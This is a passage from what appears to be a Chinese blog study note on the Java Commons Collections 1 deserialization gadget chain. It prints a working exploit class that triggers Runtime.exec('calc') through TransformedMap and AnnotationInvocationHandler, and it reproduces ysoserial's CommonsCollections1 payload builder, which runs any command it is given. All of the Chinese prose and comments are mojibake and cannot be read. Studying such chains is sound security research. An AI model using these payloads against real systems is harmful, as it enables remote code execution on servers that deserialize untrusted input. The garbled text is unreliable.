<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// InvokerTransformer.transform </span></span><br><span class="line"><span class="comment">// invokeå®ç°ä»»æ„æ–¹æ³•æ‰§è¡Œ</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h4><p>è™½ç„¶ä¸Šé¢çš„demoåœ¨æœ¬åœ°è¿è¡Œçš„æ—¶å€™æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯æˆ‘ä»¬æœ€ç»ˆæ˜¯è¦é€šè¿‡ååºåˆ—åŒ–å»å®ç°ä»»æ„ä»£ç æ‰§è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡<code>readObject</code>å»å®ç°å›è°ƒï¼Œé‚£ä¹ˆè¿™é‡Œå°±æ˜¯ç”¨åˆ°äº†<code>AnnotationInvocationHandler</code>ç±»</p>
<p>ç›´æ¥æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªç±»çš„<code>readObject</code>æ–¹æ³•ï¼ˆ8u66</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    var1.defaultReadObject(); <span class="comment">// å•çº¯è°ƒç”¨ä¸€ä»½æ–¹æ³• var1åœ¨åé¢éƒ½æ²¡æœ‰è¢«è°ƒç”¨</span></span><br><span class="line">    AnnotationType var2 = <span class="keyword">null</span>; <span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type); <span class="comment">// è·å–æˆ‘ä»¬ä¼ è¿›å»çš„ç±» Retention.class</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var3 = var2.memberTypes(); <span class="comment">// è¿”å›memberTypes</span></span><br><span class="line">    Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator(); <span class="comment">// é€šè¿‡æˆ‘ä»¬ä¼ è¿›å»çš„Mapè¿›è¡Œæ“ä½œ outerMap</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        Entry var5 = (Entry)var4.next(); </span><br><span class="line">        String var6 = (String)var5.getKey(); <span class="comment">// è·å–é”®å€¼</span></span><br><span class="line">        Class var7 = (Class)var3.get(var6); <span class="comment">//this.memberTypes.get =&gt; Map.get è·å–keyä¸ºvar6çš„value å¦åˆ™ä¸ºnull</span></span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123; <span class="comment">// ä¸èƒ½ä¸ºnull æ‰€ä»¥å‰é¢çš„var4</span></span><br><span class="line">            Object var8 = var5.getValue(); <span class="comment">// è·å–keyæ‰€æ˜ å°„çš„value</span></span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                <span class="comment">// è®¾ç½®æ–°çš„value</span></span><br><span class="line">                var5.setValue(</span><br><span class="line">                    (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">                    ).setMember(</span><br><span class="line">                        (Method)var2.members().get(var6)</span><br><span class="line">                    ));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è·å–æˆ‘ä»¬ä¼ å…¥çš„è¢«<code>TransformedMap</code>ä¿®é¥°è¿‡çš„Mapï¼Œä»¥åŠç”¨æ¥ä¿è¯<code>var7</code>ä¸ä¸ºç©ºçš„ç±»ã€‚éå†Mapé‡Œé¢çš„æˆ‘ä»¬å†™å…¥çš„ä»£ç ï¼Œéšååœ¨setValueä¸­è§¦å‘<code>TransformedMap</code>çš„<code>transform</code>ï¼Œä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œ </p>
<p><del><em><strong>è¿™é‡Œæœ‰ä¸ªå°é—®é¢˜</strong>ï¼šsetValueæ˜¯æ€ä¹ˆå®ç°è§¦å‘transformçš„ï¼Œè™½ç„¶æ‰“æ–­ç‚¹ä¹‹åèµ°æ¯”è¾ƒæ˜æ˜¾ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ç‚¹ä¸èƒ½ç†è§£ï¼Œç„¶åå‘ç°ç”¨åå°„ä¼ å…¥çš„ç±»åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œæ‰“æ–­ç‚¹è°ƒè¯•çš„æ—¶å€™æ˜¯ä¸ä¼šèµ°åˆ°è¿™ä¸ªç±»é‡Œé¢çš„ï¼Œä½†æ˜¯ä¼šåˆ°æŠ½è±¡ç±»é‡Œé¢è°ƒç”¨ä»–æ‰§è¡Œçš„æ–¹æ³• æ„Ÿè§‰è¿˜æ˜¯javaåŸºç¡€ä¸è¡Œ</em></del>ï¼ˆå·²è§£å†³</p>
<blockquote>
<ul>
<li><p>sun.reflect.annotation.AnnotationInvocationHandler æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯Annotationçš„å­ç±»ï¼Œä¸”å…¶ä¸­å¿…é¡»å«æœ‰è‡³å°‘ä¸€ä¸ªæ–¹æ³•ï¼Œå‡è®¾æ–¹æ³•åæ˜¯X</p>
</li>
<li><p>è¢« TransformedMap.decorate ä¿®é¥°çš„Mapä¸­å¿…é¡»æœ‰ä¸€ä¸ªé”®åä¸ºXçš„å…ƒç´ </p>
</li>
</ul>
</blockquote>
<p>exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC1ForP2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="comment">// getMethod(&quot;getRuntime&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="comment">// æ–¹æ³•å</span></span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="comment">// å‚æ•°ç±»å‹</span></span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125; <span class="comment">// å‚æ•°</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="comment">// =&gt; exec(&quot;calc&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers); <span class="comment">// å°†ä¸Šé¢çš„ä¸²è”èµ·æ¥ å‰é¢çš„è¿”å›å€¼è¿›è¡Œå›è°ƒ</span></span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// serialize</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// deserialize</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p>åœ¨ysoserialä¸­ä½¿ç”¨çš„æ˜¯LazyMapå¯¹<code>transformerChain</code>è¿›è¡Œä¿®é¥°ï¼Œå› ä¸ºPç¥çš„demoå·²ç»èƒ½å¤§æ¦‚çœ‹æ‡‚äº†ï¼Œé‚£ä¹ˆç°åœ¨ç›´æ¥å»çœ‹ysoserialçš„CC1å§</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">InvocationHandler</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;; <span class="comment">// æ‰§è¡Œçš„å‚æ•°</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// inert chain for setup</span></span><br><span class="line">      <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">         <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// real chain for after setup</span></span><br><span class="line">       <span class="comment">// å®ç°è°ƒç”¨Runtime.getRuntime.exec(command)</span></span><br><span class="line">      <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">               String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">               <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">               Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">               <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">               <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">      Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> handler;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      PayloadRunner.run(CommonsCollections1.class, args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å’ŒPç¥çš„demoä¸»è¦åŒºåˆ«å°±åœ¨<code>lazyMap</code>ï¼Œè¿˜æœ‰è¿™é‡Œåˆ©ç”¨äº†åŠ¨æ€ä»£ç†ï¼ˆå¯¹è±¡ä»£ç†ï¼‰ï¼ˆå¦‚æœæˆ‘æ²¡ç†è§£é”™ï¼Œåº”è¯¥å°±æ˜¯å‰é¢çš„åŠ¨æ€ä»£ç†</p>
<p>ç„¶åæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥<code>TransformedMap</code>å’Œ<code>LazyMap</code>çš„åŒºåˆ«å°±åœ¨äºï¼Œ<code>TransformedMap</code>é€šè¿‡putæ˜ å°„è€Œäº§ç”Ÿå›è°ƒï¼Œä½†æ˜¯<code>LazyMap</code>å¾ˆæ˜æ˜¾å°±ä¸æ˜¯ï¼Œé‚£ä¹ˆç°åœ¨æ¥å…·ä½“åˆ†æä¸€ä¸‹<code>LazyMap</code>çš„å·¥ä½œæµç¨‹ï¼ˆé›¾</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyMap</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title">Map</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Factory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        out.defaultWriteObject();</span><br><span class="line">        out.writeObject(<span class="keyword">super</span>.map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="keyword">super</span>.map = (Map)in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">            <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å‘ç°<code>LazyMap</code>ä¼šåœ¨getæ–¹æ³•ä¼šåœ¨åˆ¤æ–­å½“mapä¸åŒ…å«<code>key</code>çš„æ—¶å€™ä¼šè°ƒç”¨<code>transform</code>æ–¹æ³•ï¼Œå¹¶ä¸”ä¼ å…¥keyå½“ä½œå‚æ•°ï¼Œè€Œä¹‹å‰çš„é“¾å­å°±æ˜¯è°ƒç”¨<code>transform</code>ä¹‹åè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ï¼Œé‚£ä¹ˆæ˜¾è€Œæ˜“è§åªè¦å¤šæ¬¡è°ƒç”¨getæ–¹æ³•å°±åº”è¯¥å¯ä»¥å®ç°</p>
<p>ä½†æ˜¯è¦æ€ä¹ˆè°ƒç”¨<code>get</code>æ–¹æ³•å‘¢</p>
<p>æˆ‘ä»¬è·Ÿè¿›ï¼Œè¯•ç€è¯»ä¸€ä¸‹ä»£ç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>Gadgets</code>ä¸­åˆ©ç”¨åŠ¨æ€ä»£ç†å®ä¾‹åŒ–AnnotationInvocationHandlerä»è€ŒåŠ¨æ€ä»£ç†ä¸”è‡ªåŠ¨è°ƒç”¨<code>AnnotationInvocationHandler</code>é‡å†™çš„invokeæ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createMemoitizedProxy</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// æˆ‘ä»¬ä¼ å…¥çš„æ˜¯lazyMapä¿®é¥°ä¹‹åçš„hashMapå’ŒTransformer è¿˜æœ‰Map.class</span></span><br><span class="line">    <span class="keyword">return</span> createProxy(createMemoizedInvocationHandler(map), iface, ifaces);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title">createMemoizedInvocationHandler</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// ANN_INV_HANDLER_CLASSæ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œå€¼ä¸ºAnnotationInvocationHandlerå®Œæ•´çš„ç±»å </span></span><br><span class="line">    <span class="comment">// è¯´æ˜è¿™é‡Œå°±ç›¸å½“äºæ˜¯å®ä¾‹åŒ–äº†è¿™ä¸ªç±» ç„¶åä¼ å…¥mapä½¿å¾—this.memberValues = lazyMap;</span></span><br><span class="line">    <span class="keyword">return</span> (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createProxy</span> <span class="params">( <span class="keyword">final</span> InvocationHandler ih, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt;[] allIfaces = (Class&lt;?&gt;[]) Array.newInstance(Class.class, ifaces.length + <span class="number">1</span>);</span><br><span class="line">    allIfaces[ <span class="number">0</span> ] = iface;</span><br><span class="line">    <span class="keyword">if</span> ( ifaces.length &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">            System.arraycopy(ifaces, <span class="number">0</span>, allIfaces, <span class="number">1</span>, ifaces.length);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih)); <span class="comment">// åŠ¨æ€ä»£ç†</span></span><br><span class="line">    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>AnnotationInvocationHandler</code>çš„<code>invoke</code>æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°åœ¨è¿™é‡Œä¼šè°ƒç”¨<code>LazyMap</code>çš„getæ–¹æ³•</p>
<p><del><em>ä½†æ˜¯è¿™é‡Œçš„å‚æ•°æ˜¯æ€ä¹ˆä¼ è¿›å»çš„å‘¢ï¼Ÿ æ‰“æ–­ç‚¹è°ƒè¯•äº†ä¸€ä¸‹å‘ç°æ˜¯é€šè¿‡entrySetè°ƒç”¨invokeçš„ï¼Œä½†æ˜¯å“ªé‡Œè°ƒç”¨çš„entrySetä»è€Œå¯¼è‡´è°ƒç”¨çš„invokeå‘¢ï¼Ÿ</em></del>ï¼ˆå·²è§£å†³</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">    String var4 = var2.getName();</span><br><span class="line">   â€¦â€¦</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(var7) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            Object var6 = <span class="keyword">this</span>.memberValues.get(var4);</span><br><span class="line">            <span class="keyword">if</span> (var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(<span class="keyword">this</span>.type, var4);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                    var6 = <span class="keyword">this</span>.cloneArray(var6);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> var6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>å› ä¸ºæ¯”è¾ƒèœï¼Œæ‰€ä»¥å°±æ‰“æ–­ç‚¹ä¹‹åå†™ä¸‹æ­¥éª¤ï¼š</p>
<p>1.å…ˆè¿›å…¥LazyMapçš„readObjectã€decorateï¼Œä½¿å¾—<code>this.factory=transformerChain;super.map=HashMap()</code></p>
<p>2.<code>super.map = (Map)in.readObject()</code>ï¼Œæ‰“æ–­å¯ä»¥å‘ç°ï¼Œä¸‹ä¸€ä¸ªååºåˆ—åŒ–çš„ç±»åº”è¯¥æ˜¯<code>AnnotationInvocationHandler</code>ï¼Œä½†æ˜¯ç”±äºæ˜¯é€šè¿‡åå°„å®ä¾‹åŒ–çš„ï¼Œæ‰€ä»¥æ²¡æœ‰ç›´æ¥æ˜¾ç¤ºå‡ºæ¥ï¼ˆå¤§æ¦‚ï¼‰ï¼Œè¿›å…¥<code>AnnotationInvocationHandler</code>çš„readObjectï¼Œåœ¨<code>Iterator var4 = this.memberValues.entrySet().iterator();</code>è°ƒç”¨åˆ°äº†<code>LazyMap.entrySet()</code>ä¹‹åè½¬åˆ°<code>entrySet</code></p>
